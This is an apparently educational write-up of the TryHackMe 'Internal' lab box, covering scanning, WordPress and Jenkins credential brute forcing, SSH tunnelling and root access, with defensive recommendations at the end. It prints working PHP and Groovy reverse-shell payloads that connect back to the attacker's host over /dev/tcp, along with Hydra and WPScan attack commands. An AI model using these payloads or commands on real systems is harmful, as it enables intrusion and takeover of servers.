# TryHackMe - Internal Box Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-Internal-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
![Completion Time](https://img.shields.io/badge/Time-4.5_Hours-blue?style=for-the-badge)

**Room:** Internal  
**Difficulty:** Hard  
**Category:** Black Box Penetration Test  
**Date Completed:** November 9, 2025  
**Author:** AlperKurtulus

---

## 📋 Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Initial Access](#initial-access)
5. [Lateral Movement](#lateral-movement)
6. [Privilege Escalation](#privilege-escalation)
7. [Lessons Learned](#lessons-learned)
8. [Tools Used](#tools-used)

---

## 🎯 Challenge Overview

Internal is a Hard-level box that simulates a realistic black-box penetration test. The challenge involves:
- Comprehensive web application enumeration
- WordPress exploitation
- Credential hunting
- SSH tunneling
- Jenkins exploitation
- Docker container escape
- Multi-layered privilege escalation

**Flags:**
- User Flag: `THM{int3rna1_fl***********}`
- Root Flag: `THM{d0ck3r_d3s***********}`

---

## 🔍 Reconnaissance

### Initial Nmap Scan

**All ports scan:**
```bash
nmap -p- --min-rate=1000 -T4 -Pn -oN all_ports.txt 10.10.168.248
```

**Results:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Detailed Service Scan

```bash
nmap -sC -sV -p22,80 -oN nmap_detailed_scan.txt 10.10.168.248
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Observations:**
- Only 2 ports open (SSH, HTTP)
- Ubuntu Linux system
- Apache web server running
- Standard Apache default page

---

## 🕵️ Enumeration

### Web Enumeration

**Initial web page:** Apache2 Ubuntu Default Page

**Directory enumeration with Gobuster:**
```bash
gobuster dir -u http://10.10.168.248 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -o gobuster.txt
```

**Discovered directories:**
```
/blog                 (Status: 301) → http://10.10.168.248/blog/
/wordpress            (Status: 301) → http://10.10.168.248/wordpress/
/javascript           (Status: 301) → http://10.10.168.248/javascript/
/phpmyadmin           (Status: 301) → http://10.10.168.248/phpmyadmin/
/.php                 (Status: 403)
```

**Key Finding:** WordPress installation at `/wordpress`

### WordPress Enumeration

**WPScan for username enumeration:**
```bash
wpscan --url http://10.10.168.248/wordpress -e u
```

**Found usernames:**
- `admin`

**WPScan for password brute force:**
```bash
wpscan --url http://10.10.168.248/wordpress \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt
```

**Credentials discovered:**
- Username: `admin`
- Password: `[REDACTED via brute force]`

---

## 💥 Initial Access

### WordPress Theme Editor Exploitation

**Step 1: Login to WordPress admin panel**
- Navigate to: `http://10.10.168.248/wordpress/wp-admin`
- Use discovered credentials

**Step 2: Navigate to Theme Editor**
- WordPress Dashboard → Appearance → Theme Editor
- Select: 404 Template (404.php)

**Step 3: Insert reverse shell payload**

Replace the 404.php content with:

```php
<?php
  $ip = '10.8.XX.XX';  // Your VPN IP
  $port = 4444;
  
  shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>
```

**Step 4: Setup netcat listener**
```bash
nc -lvnp 4444
```

**Step 5: Trigger the payload**
- Navigate to any non-existent page to trigger 404 error:
- `http://10.10.168.248/wordpress/any-non-existent-page`
- Or directly access: `http://10.10.168.248/wordpress/wp-content/themes/twentyseventeen/404.php`

**Step 6: Shell received**
```bash
Connection from 10.10.168.248:XXXXX
bash: cannot set terminal process group (1231): Inappropriate ioctl for device
bash: no job control in this shell
www-data@internal:/var/www/html/wordpress/wp-content/themes/twentyseventeen$
```

### Shell Stabilization

```bash
# Step 1: Spawn a python PTY
python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell
# Press Ctrl+Z

# Step 3: Set terminal to raw mode
stty raw -echo

# Step 4: Foreground the shell
fg

# Step 5: Press Enter twice

# Step 6: Set terminal type and size
export TERM=xterm
stty rows 24 cols 80
```

**Successful stabilized shell:**
```bash
www-data@internal:/var/www/html/wordpress/wp-content/themes/twentyseventeen$
```

---

## 🔓 Lateral Movement

### User Enumeration

```bash
ls /home
# Output: aubreanna
```

**Attempted access:**
```bash
cd /home/aubreanna
# bash: cd: /home/aubreanna/: Permission denied
```

### Privilege Escalation Enumeration

**Transfer and run LinPEAS:**

```bash
# On attacker machine:
python3 -m http.server 8000

# On target machine:
cd /tmp
wget http://10.8.XX.XX:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Result:** LinPEAS didn't reveal obvious privilege escalation vectors.

### Manual Enumeration - Critical Thinking

**Reasoning:** Since this is a WordPress environment, search for WordPress-related configuration files:

```bash
find / -name "*wp*" 2>/dev/null
```

**Output (relevant):**
```
/var/www/html/wordpress/wp-config.php
/var/www/html/wordpress/wp-content
/var/www/html/wordpress/wp-includes
/opt/wp-save.txt                           ← Interesting!
```

**Investigating the suspicious file:**
```bash
cat /opt/wp-save.txt
```

**Contents:**
```
Bill,

Aubreanna needed these credentials for something later. Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

**💡 Key Discovery:** User credentials found!

### Switch User

```bash
su aubreanna
# Password: bubb13guM!@#123
```

**Success! User shell obtained:**
```bash
aubreanna@internal:/tmp$ whoami
aubreanna
```

### User Flag

```bash
find / -name "user.txt" 2>/dev/null
```

**Output:**
```
/home/aubreanna/user.txt
/usr/share/doc/phpmyadmin/html/_sources/user.txt
```

**Reading the flag:**
```bash
cat /home/aubreanna/user.txt
```

**User Flag:** `THM{int3rna1_fl***********}`

---

## 🚀 Privilege Escalation

### Jenkins Service Discovery

**Enumerate home directory:**
```bash
cd /home/aubreanna
ls -la
```

**Output:**
```
drwxr-xr-x 6 aubreanna aubreanna 4096 Aug  3  2020 .
drwxr-xr-x 3 root      root      4096 Aug  3  2020 ..
-rw------- 1 aubreanna aubreanna    0 Aug  3  2020 .bash_history
-rw-r--r-- 1 aubreanna aubreanna  220 Aug  3  2020 .bash_logout
-rw-r--r-- 1 aubreanna aubreanna 3771 Aug  3  2020 .bashrc
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
-rw------- 1 aubreanna aubreanna   51 Aug  3  2020 jenkins.txt
-rw-r--r-- 1 aubreanna aubreanna  807 Aug  3  2020 .profile
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
drwxrwxr-x 3 aubreanna aubreanna 4096 Aug  3  2020 snap
-rw------- 1 aubreanna aubreanna   26 Aug  3  2020 user.txt
```

**Interesting file: jenkins.txt**

```bash
cat jenkins.txt
```

**Contents:**
```
Internal Jenkins service is running on 172.17.0.2:8080
```

**Analysis:**
- Jenkins is running inside a Docker container
- Internal IP: `172.17.0.2`
- Port: `8080`
- Not accessible from external network directly

### SSH Tunneling

**Setup SSH local port forwarding:**

```bash
# From your attacker machine:
ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.168.248
# Password: bubb13guM!@#123
```

**Explanation:**
- `-L 8080:172.17.0.2:8080` creates a tunnel
- Local port 8080 → forwards to → 172.17.0.2:8080 through SSH connection
- Now we can access Jenkins on `http://localhost:8080`

**Access Jenkins:**
- Open browser: `http://localhost:8080`
- Jenkins login page appears ✅

### Jenkins Authentication Attempts

**Tried common credentials:**
```
❌ aubreanna:bubb13guM!@#123
❌ william:arnold147
❌ admin:my2boys
❌ jenkins:bubb13guM!@#123
❌ admin:admin
```

**Decision:** All manual attempts failed. Time for brute force.

### Hydra Brute Force Attack

**Capture login request parameters:**

1. Open browser developer tools (F12)
2. Attempt login with fake credentials
3. Inspect POST request in Network tab

**Captured parameters:**
- Login endpoint: `/j_acegi_security_check`
- Username parameter: `j_username`
- Password parameter: `j_password`
- Failure indicator: `Invalid username or password`

**Hydra command:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8080 \
  http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" \
  -t 16 -v
```

**Success after several minutes:**
```
[8080][http-post-form] host: localhost   login: admin   password: spongebob
```

**Jenkins credentials:**
- Username: `admin`
- Password: `spongebob`

### Jenkins Script Console Exploitation

**Step 1: Login to Jenkins**
- Use credentials: `admin:spongebob`

**Step 2: Navigate to Script Console**
- Dashboard → Manage Jenkins → Script Console
- This provides Groovy script execution with Jenkins privileges

**Step 3: Prepare reverse shell payload**

Groovy script for reverse shell:

```java
String host="10.8.XX.XX";  // Your VPN IP
int port=8888;             // Different port from previous shell

String cmd="/bin/bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'";

Process p=new ProcessBuilder("/bin/bash", "-c", cmd).redirectErrorStream(true).start();
InputStream pi=p.getInputStream(),pe=p.getErrorStream();

while(true) {
    Thread.sleep(1000);
};
```

**Step 4: Setup netcat listener**
```bash
nc -lvnp 8888
```

**Step 5: Execute the script in Jenkins**
- Paste the Groovy code into Script Console
- Click "Run"

**Step 6: Shell received**
```bash
Connection from 172.17.0.2:XXXXX
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@jenkins:/$ whoami
jenkins
```

**Note:** We're now inside the Docker container as `jenkins` user!

### Shell Stabilization (Jenkins Container)

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo
fg
# Press Enter twice
export TERM=xterm
stty rows 24 cols 80
```

### Docker Container Enumeration

**Check home directory:**
```bash
cd /home
ls
# Empty
```

**Check common locations:**
```bash
cd /
ls -la
```

**Reasoning:** Previous credentials were in `/opt`, let's check there:

```bash
ls /opt
# Output: note.txt

cat /opt/note.txt
```

**Contents:**
```
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here. Use them if you need access to the root user account.

root:tr0ub13guM!@#123
```

**💡 Critical Discovery:** Root credentials!

### Root Access

**Exit Docker container and return to SSH session as aubreanna** (or use the original www-data shell):

```bash
su root
# Password: tr0ub13guM!@#123
```

**Success! Root access obtained:**
```bash
root@internal:/home/aubreanna# whoami
root

root@internal:/home/aubreanna# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag

```bash
find / -name "root.txt" 2>/dev/null
```

**Output:**
```
/root/root.txt
```

**Reading the flag:**
```bash
cat /root/root.txt
```

**Root Flag:** `THM{d0ck3r_d3s***********}`

---

## 🎓 Lessons Learned

### Key Takeaways

#### 1. **Manual Enumeration is Critical**
- LinPEAS and automated tools don't catch everything
- Creative file searching revealed `/opt/wp-save.txt`
- Pattern-based searching (`find / -name "*wp*"`) is powerful
- Understanding the target environment guides enumeration

#### 2. **Multi-Layered Defense Exploitation**
The attack chain involved multiple layers:
```
WordPress → www-data shell
    ↓
Manual enum → User credentials
    ↓
SSH tunneling → Internal service access
    ↓
Jenkins exploitation → Container access
    ↓
Container enum → Root credentials
    ↓
Root access → Complete compromise
```

#### 3. **SSH Tunneling for Internal Services**
- Docker containers on internal networks are common in production
- SSH local port forwarding: `ssh -L local_port:remote_host:remote_port user@server`
- Enables access to services not exposed externally
- Critical skill for real-world penetration testing

#### 4. **Jenkins Security Weaknesses**
- Default/weak credentials are surprisingly common
- Script Console provides powerful arbitrary code execution
- Groovy scripts can spawn reverse shells easily
- Jenkins should never be exposed without strong authentication

#### 5. **Brute Force as Last Resort**
- When credential guessing fails, brute force may be necessary
- Hydra is powerful for web form authentication
- Proper POST parameter identification is crucial
- rockyou.txt remains effective against weak passwords

#### 6. **Credential Reuse Patterns**
- Notice the password pattern: `bubb13guM!@#123` and `tr0ub13guM!@#123`
- Similar structure suggests password reuse/pattern
- Users often create "variations" of base passwords
- This weakness can be exploited in real engagements

### What Worked Well

✅ **Systematic enumeration approach** - Methodical directory brute forcing  
✅ **WordPress exploitation** - Theme editor is a classic attack vector  
✅ **Creative file searching** - Using `find` with patterns  
✅ **SSH tunneling** - Accessing internal Jenkins instance  
✅ **Hydra brute force** - Successful credential discovery  
✅ **Jenkins Script Console** - Reliable RCE method  
✅ **Shell stabilization** - Maintained stable interactive shells throughout

### Challenges Faced

⚠️ **LinPEAS limitations:** Automated tools didn't find credentials in `/opt`  
⚠️ **Multiple credential sets:** Had to track different creds for different services  
⚠️ **Jenkins brute force time:** Took ~15-20 minutes with rockyou.txt  
⚠️ **Docker container confusion:** Initially unclear about container vs host system  
⚠️ **Multiple shells:** Managing www-data, aubreanna, and jenkins shells simultaneously

### Alternative Approaches

**WordPress Exploitation:**
- Metasploit module: `exploit/unix/webapp/wp_admin_shell_upload`
- Plugin upload vulnerability instead of theme editor
- Direct file upload via POST request

**Jenkins Exploitation:**
- Metasploit module: `exploit/multi/http/jenkins_script_console`
- Jenkins CLI exploitation
- Known CVE exploits if version is vulnerable

**Privilege Escalation:**
- Docker socket enumeration for container escape
- Kernel exploits on the host system
- Check for `/var/run/docker.sock` access

**Credential Discovery:**
- MySQL database enumeration from WordPress config
- Check `/var/www/html/wordpress/wp-config.php` for DB creds
- Grep for passwords: `grep -r "password" /var/www/ 2>/dev/null`

---

## 🛠️ Tools Used

### Reconnaissance & Enumeration
- **Nmap** - Port scanning and service enumeration
- **Gobuster** - Directory and file brute forcing
- **WPScan** - WordPress vulnerability scanner
- **LinPEAS** - Linux privilege escalation enumeration script

### Exploitation
- **Netcat (nc)** - Reverse shell listener
- **Hydra** - Brute force authentication attacks
- **SSH** - Tunneling and secure access
- **Bash** - Shell scripting and command execution

### Utilities
- **Python HTTP Server** - File transfer (`python3 -m http.server`)
- **Find** - File system enumeration
- **Grep** - Pattern searching
- **Cat** - File reading
- **Su** - User switching

### Scripting
- **PHP** - Reverse shell payload
- **Groovy** - Jenkins Script Console exploitation
- **Python** - Shell stabilization

---

## 📊 Attack Chain Summary

```
┌─────────────────────────────────────────────────────────┐
│  [1] Nmap Scan → Ports 22, 80 discovered               │
└───────────────────────┬─────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────┐
│  [2] Gobuster → /wordpress directory found              │
└───────────────────────┬─────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────┐
│  [3] WPScan → WordPress admin credentials brute forced  │
└───────────────────────┬─────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────┐
│  [4] WordPress Admin → Theme Editor 404.php RCE         │
└───────────────────────┬─────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────┐
│  [5] www-data shell → Manual enum: /opt/wp-save.txt     │
└───────────────────────┬─────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────┐
│  [6] aubreanna user → jenkins.txt discovered            │
└───────────────────────┬─────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────┐
│  [7] SSH Tunnel → Access Jenkins (172.17.0.2:8080)      │
└───────────────────────┬─────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────┐
│  [8] Hydra → Jenkins admin:spongebob                    │
└───────────────────────┬─────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────┐
│  [9] Jenkins Script Console → Groovy reverse shell      │
└───────────────────────┬─────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────┐
│  [10] jenkins container → /opt/note.txt root creds      │
└───────────────────────┬─────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────┐
│  [11] Root Access → Game Over!                          │
└─────────────────────────────────────────────────────────┘
```

---

## 🎯 Defensive Recommendations

### For Defenders & System Administrators

#### **1. WordPress Hardening**
```php
// Disable file editing in wp-config.php
define('DISALLOW_FILE_EDIT', true);
define('DISALLOW_FILE_MODS', true);
```
- Implement strong password policies (16+ characters)
- Use Two-Factor Authentication (2FA) for admin accounts
- Regular WordPress core, theme, and plugin updates
- Limit login attempts with plugins like Limit Login Attempts
- Hide WordPress version information
- Use security plugins (Wordfence, Sucuri, iThemes Security)

#### **2. Credential Management**
- **Never** store plaintext passwords in files
- Use secrets management tools (HashiCorp Vault, AWS Secrets Manager)
- Implement password rotation policies
- Follow least privilege principle
- Use different passwords for different services
- Consider password managers for teams

#### **3. Network Segmentation**
- Internal services (Jenkins) shouldn't be directly accessible
- Implement firewall rules and network isolation
- Use VPN for internal service access
- Separate production and development environments
- Implement DMZ for public-facing services

#### **4. Jenkins Security**
```groovy
// Disable Script Console in production
// In Jenkins system configuration
hudson.security.csrf.DefaultCrumbIssuer.EXCLUDE_SESSION_ID = true
```
- **Disable Script Console** in production environments
- Implement role-based access control (RBAC)
- Use matrix-based security with specific permissions
- Enable CSRF protection
- Regular security audits and updates
- Use authentication plugins (LDAP, Active Directory)
- Implement IP whitelisting for admin access

#### **5. Docker Security**
- Never store sensitive credentials in containers
- Use Docker secrets management: `docker secret create`
- Implement container isolation and resource limits
- Regular container image scanning (Trivy, Clair)
- Use minimal base images (Alpine Linux)
- Run containers as non-root users
- Limit container capabilities

#### **6. SSH Hardening**
```bash
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no  # Use keys only
PubkeyAuthentication yes
Port 2222  # Non-standard port
AllowUsers aubreanna  # Whitelist specific users
```

#### **7. Monitoring & Logging**
- Implement centralized logging (ELK Stack, Splunk)
- Monitor for:
  - Failed login attempts
  - Unusual network connections
  - File modifications in web directories
  - Privilege escalation attempts
- Set up alerts for suspicious activities
- Regular log review and analysis

#### **8. Security Policies**
- Regular security assessments and penetration testing
- Incident response plan
- Security awareness training for all staff
- Patch management procedures
- Backup and disaster recovery plans

---

## 📝 Detailed Timeline

### Time Breakdown

| Phase | Activity | Duration |
|-------|----------|----------|
| **Reconnaissance** | Nmap scanning | 15 min |
| **Enumeration** | Gobuster directory brute force | 20 min |
| | WPScan enumeration | 15 min |
| | WPScan credential brute force | 30 min |
| **Initial Access** | WordPress exploitation (theme editor) | 20 min |
| | Reverse shell stabilization | 5 min |
| **Lateral Movement** | LinPEAS enumeration | 20 min |
| | Manual file searching | 30 min |
| | Finding /opt/wp-save.txt | 15 min |
| | User switch and flag | 5 min |
| **Privilege Escalation** | Jenkins discovery | 5 min |
| | SSH tunnel setup | 10 min |
| | Jenkins login attempts | 10 min |
| | Hydra brute force | 45 min |
| | Jenkins Script Console research | 15 min |
| | Jenkins exploitation | 15 min |
| | Container enumeration | 10 min |
| | Root access and flag | 5 min |
| **Documentation** | Screenshots and notes | 15 min |

**Total Time:** 4 hours 30 minutes

---

## 🔗 References

- [TryHackMe - Internal Room](https://tryhackme.com/room/internal)
- [WordPress Security Best Practices](https://wordpress.org/support/article/hardening-wordpress/)
- [Jenkins Security Documentation](https://www.jenkins.io/doc/book/security/)
- [SSH Tunneling Guide](https://www.ssh.com/academy/ssh/tunneling)
- [Hydra Documentation](https://github.com/vanhauser-thc/thc-hydra)
- [Docker Security Best Practices](https://docs.docker.com/develop/security-best-practices/)
- [OWASP WordPress Security](https://owasp.org/www-community/vulnerabilities/WordPress)

---

## 📸 Proof of Compromise

```bash
# Root shell verification
root@internal:~# whoami
root

root@internal:~# id
uid=0(root) gid=0(root) groups=0(root)

root@internal:~# hostname
internal

root@internal:~# ip a
inet 10.10.168.248/16

root@internal:~# cat /root/root.txt
THM{d0ck3r_d3s***********}

root@internal:~# cat /home/aubreanna/user.txt
THM{int3rna1_fl***********}
```

---

## 🎓 Skills Demonstrated

### Technical Skills
✅ Network reconnaissance and port scanning  
✅ Web application enumeration (directory brute forcing)  
✅ WordPress vulnerability identification and exploitation  
✅ Reverse shell generation and stabilization  
✅ Linux privilege escalation techniques  
✅ Manual file system enumeration and pattern searching  
✅ SSH local port forwarding and tunneling  
✅ Hydra brute force attacks on web authentication  
✅ Jenkins Script Console exploitation (Groovy scripting)  
✅ Docker container enumeration and escape  
✅ Credential hunting and pattern recognition  
✅ Multi-stage attack chain execution  

### Soft Skills
✅ Critical thinking and creative problem-solving  
✅ Persistence when automated tools fail  
✅ Methodical documentation and note-taking  
✅ Time management during engagements  
✅ Attention to detail in enumeration  

---

## 💭 Personal Notes

### What I Learned

1. **Automated tools are helpers, not solutions** - LinPEAS didn't find the critical credentials. Manual enumeration and understanding the target environment (WordPress → look for wp-related files) was key.

2. **Pattern recognition matters** - The password patterns (`bubb13guM!@#123` vs `tr0ub13guM!@#123`) show how users create variations. This could be exploited in larger engagements.

3. **SSH tunneling is a critical skill** - Many internal services (like Jenkins) aren't meant to be public-facing. Being able to tunnel through compromised hosts is essential for real-world pentesting.

4. **Patience with brute forcing** - The 45-minute Hydra attack felt long, but it was necessary and successful. In real engagements, this would need approval and careful consideration of account lockout policies.

5. **Multi-layered defenses can all fail** - This box showed how multiple security layers (WordPress, user separation, Docker containers) can all be bypassed if each layer has a weakness.

### What I Would Do Differently

- **Better time management** - Spent too long with LinPEAS before trying manual enumeration
- **Earlier credential testing** - Should have tried the aubreanna credentials on Jenkins sooner
- **Note organization** - Could have organized findings better during the engagement
- **Automated scripting** - Could write a script to automate the WordPress→theme editor→RCE process for future use

### Favorite Part

The SSH tunneling to access the internal Jenkins instance was my favorite part. It felt like a real-world scenario where internal services are properly network-segmented, but once you have a foothold, you can pivot through the network.

---

**Author:** AlperKurtulus  
**Date:** November 9, 2025  
**Platform:** TryHackMe  
**Repository:** [github.com/AlperKurtulus/ctf-security-portfolio](https://github.com/AlperKurtulus/ctf-security-portfolio)  
**Profile:** [tryhackme.com/p/TheJker](https://tryhackme.com/p/TheJker)

---

*This writeup is for educational purposes only. Always obtain proper authorization before performing security testing. Unauthorized access to computer systems is illegal.*
